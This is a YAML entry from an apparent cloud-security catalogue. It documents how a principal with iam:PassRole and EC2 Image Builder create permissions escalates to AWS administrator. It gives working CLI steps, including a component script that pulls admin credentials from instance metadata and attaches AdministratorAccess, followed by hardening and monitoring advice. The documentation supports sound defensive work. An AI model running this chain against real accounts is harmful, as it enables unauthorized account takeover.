id: imagebuilder-001
name: iam:PassRole + imagebuilder:CreateComponent + imagebuilder:CreateImageRecipe + imagebuilder:CreateInfrastructureConfiguration + imagebuilder:CreateImage
category: new-passrole
services:
  - iam
  - imagebuilder
  - ec2

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must be able to pass the target admin IAM instance profile role to the EC2 Image Builder service
    - permission: imagebuilder:CreateComponent
      resourceConstraints: No resource constraints required
    - permission: imagebuilder:CreateImageRecipe
      resourceConstraints: No resource constraints required
    - permission: imagebuilder:CreateInfrastructureConfiguration
      resourceConstraints: No resource constraints required; this step contains the iam:PassRole of the instance profile
    - permission: imagebuilder:CreateImage
      resourceConstraints: No resource constraints required
  additional:
    - permission: imagebuilder:GetComponent
      resourceConstraints: Useful for verifying component creation
    - permission: imagebuilder:GetImage
      resourceConstraints: Useful for polling image build status
    - permission: imagebuilder:GetImageRecipe
      resourceConstraints: Useful for verifying recipe configuration
    - permission: imagebuilder:GetInfrastructureConfiguration
      resourceConstraints: Useful for verifying infrastructure configuration
    - permission: imagebuilder:TagResource
      resourceConstraints: Required in some regions or configurations
    - permission: ec2:DescribeImages
      resourceConstraints: Useful for finding the base AMI to use in the image recipe
    - permission: imagebuilder:ListImages
      resourceConstraints: Helpful for discovering existing images and their build status
    - permission: iam:ListAttachedUserPolicies
      resourceConstraints: Useful for verifying privilege escalation success

description: >-
  A principal with `iam:PassRole` and EC2 Image Builder creation permissions can escalate privileges by building a multi-step pipeline
  (creating a component containing malicious shell commands, adding it to an image recipe, creating an infrastructure configuration that
  passes an admin IAM instance profile, then triggering an image build). The Image Builder agent (SSM) runs the component's shell commands
  on an EC2 build instance that has the admin instance profile attached, giving the commands access to admin credentials via IMDS.
  The commands call `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user.

prerequisites:
  admin:
    - A role must exist that can be used as an EC2 instance profile (trusts ec2.amazonaws.com)
    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
    - The AWS Image Builder service-linked role (AWSServiceRoleForImageBuilder) must exist in the account
    - The EC2ImageBuilderLifecycleAccessPolicy policy or equivalent must be attached to the instance profile role
  lateral:
    - A role must exist that can be used as an EC2 instance profile and has elevated permissions
    - The AWSServiceRoleForImageBuilder SLR must exist in the account

exploitationSteps:
  awscli:
    - step: 1
      command: |
        cat > /tmp/imagebuilder-component.yaml << 'EOF'
        name: privesc-component
        description: Privilege escalation component
        schemaVersion: 1.0
        phases:
          - name: build
            steps:
              - name: Exploit
                action: ExecuteBash
                inputs:
                  commands:
                    - |
                      TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
                        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
                      ROLE_CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
                        http://169.254.169.254/latest/meta-data/iam/security-credentials/ADMIN_ROLE)
                      export AWS_ACCESS_KEY_ID=$(echo $ROLE_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
                      export AWS_SECRET_ACCESS_KEY=$(echo $ROLE_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])")
                      export AWS_SESSION_TOKEN=$(echo $ROLE_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Token'])")
                      aws iam attach-user-policy \
                        --user-name STARTING_USER \
                        --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
        EOF

        aws imagebuilder create-component \
          --name privesc-component \
          --semantic-version 1.0.0 \
          --platform Linux \
          --data file:///tmp/imagebuilder-component.yaml
      description: Create a malicious Image Builder component containing shell commands that retrieve admin credentials from IMDS and call iam:AttachUserPolicy to escalate privileges.
    - step: 2
      command: |
        BASE_AMI=$(aws ssm get-parameter \
          --name /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 \
          --query 'Parameter.Value' \
          --output text)

        aws imagebuilder create-image-recipe \
          --name privesc-recipe \
          --semantic-version 1.0.0 \
          --parent-image $BASE_AMI \
          --components componentArn=COMPONENT_ARN
      description: Create an image recipe that incorporates the malicious component, using the latest Amazon Linux 2023 AMI as the base image.
    - step: 3
      command: |
        aws imagebuilder create-infrastructure-configuration \
          --name privesc-infra-config \
          --instance-profile-name ADMIN_INSTANCE_PROFILE \
          --instance-types t3.medium
      description: Create an infrastructure configuration passing the admin instance profile. This is the iam:PassRole step — the instance profile role will be attached to the EC2 build instance.
    - step: 4
      command: |
        aws imagebuilder create-image \
          --image-recipe-arn RECIPE_ARN \
          --infrastructure-configuration-arn INFRA_CONFIG_ARN
      description: Trigger the image build. Image Builder provisions an EC2 instance with the admin instance profile, runs the component shell commands, and the commands escalate privileges. The build typically takes 10-20 minutes.

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative EC2 Image Builder instance profiles** - Build instances rarely need administrative access. Scope instance profiles to only the S3 buckets and services required for the build process.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificImageBuilderRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "ec2.amazonaws.com"
      }
    }
  }
  ```

  - **Restrict Image Builder creation permissions** - Treat `imagebuilder:CreateComponent`, `imagebuilder:CreateImageRecipe`, `imagebuilder:CreateInfrastructureConfiguration`, and `imagebuilder:CreateImage` as privileged permissions. All four together form a complete attack chain.
  - Monitor CloudTrail for unusual Image Builder component creation with shell commands that access IMDS or call IAM APIs
  - Monitor CloudTrail for image builds triggered by principals who do not usually build images
  - Monitor CloudTrail for infrastructure configurations referencing privileged instance profiles
  - Alert on IAM policy attachment events originating from EC2 instances running Image Builder builds
  - Regularly audit Image Builder infrastructure configurations for excessive IAM permissions on instance profiles

limitations: |
  This path provides administrative access only if the passed instance profile role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Image builds typically take 10-20 minutes to complete, making this a slower escalation path. The `ssm:GetParameter` permission must not be in the starting user's helpful permissions set, as it is used by the flag-capture step and would be denied by the restriction policy.

discoveryAttribution:
  firstDocumented:
    author: Zander Mackie
    organization: Datadog
    date: "2025"

references:
